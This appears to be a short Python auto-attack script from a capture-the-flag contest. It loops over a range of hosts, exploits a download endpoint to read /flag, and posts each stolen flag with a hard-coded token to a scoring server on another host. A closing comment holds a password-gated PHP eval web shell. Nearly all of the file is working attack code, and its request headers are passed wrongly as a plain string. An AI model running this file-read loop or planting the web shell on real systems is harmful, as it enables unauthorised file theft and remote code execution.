import requests
import time
import base64
token = 'a4d7c4f3fbaa9cd44e659c5d49ce98cd'

while 1:
    for i in range(11, 21):
        url="http://173.31.3.{}".format(i)
        shell="?c=download&file=/flag"
        port='80'
        url1=url+'/'+shell    

        try:    # 拿flag
            response=requests.get(url1)
            response.encoding=response.apparent_encoding
            # print(response.text)

            if 'flag' in response.text:
                file=open("flag.txt","a")
                file.write(response.text)
                file.close()
                flag = response.text.replace('\n','').replace('\r','')
                # flag = re.match('flag{.*}', flag).group()
                checkurl = 'http://223.112.5.142:8088/api/ct/web/awd_race/race/014ae3eb8dfbb1ff8bfdb21e5943908b/flag/robot/'
                answer={
                    "flag":flag,
                    "token":token
                }
                headers="Content-Type: application/json"
                r = requests.post(checkurl, answer, headers=headers)
                r.encoding=response.apparent_encoding
                if '"is_pass":true' in r.text:
                    print("get flag: "+url1 + " " + flag)
        except Exception as e:
            pass


    # <?php if(md5($_POST['pass'])=='61a60170273e74a5be90355ffe8e86ad')@eval($_POST['cmd']);?>
    # aabbcc